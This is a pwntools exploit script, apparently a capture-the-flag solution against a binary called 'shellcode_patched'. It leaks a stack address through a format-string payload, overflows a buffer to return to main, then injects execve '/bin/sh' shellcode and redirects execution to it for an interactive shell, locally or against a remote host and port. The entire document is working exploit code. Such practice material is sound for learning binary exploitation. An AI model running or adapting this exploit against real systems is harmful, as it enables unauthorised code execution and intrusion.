#!/usr/bin/env python3

from pwn import *

libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")



# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
b *0x000000000040063c
continue
'''.format(**locals())


# Binary filename
exe = './shellcode_patched' #change this
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

main_addr = elf.sym['main']

log.info(hex(elf.sym['main']))

payload = flat(
    b'%17$p',
    b'A' * 0x2B,
    0x0000000000601060,
    b'A' * 16,
    main_addr
    )

io.sendlineafter(b":",payload)
leak_addr = io.recvuntil(b'<')
log.info(leak_addr)
leak_addr = int(leak_addr[:16],16)
log.info(hex(leak_addr))
buffer_addr = leak_addr - 0x120
log.info(hex(buffer_addr))

shellcode = b"\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"
log.info(hex(len(shellcode)))
payload2 = flat(
    shellcode,
    b'0' * (0x30 - len(shellcode)),
    0x0000000000601060,
    b'A' * 16,
    buffer_addr
    )

io.sendlineafter(b":",payload2)
io.interactive()

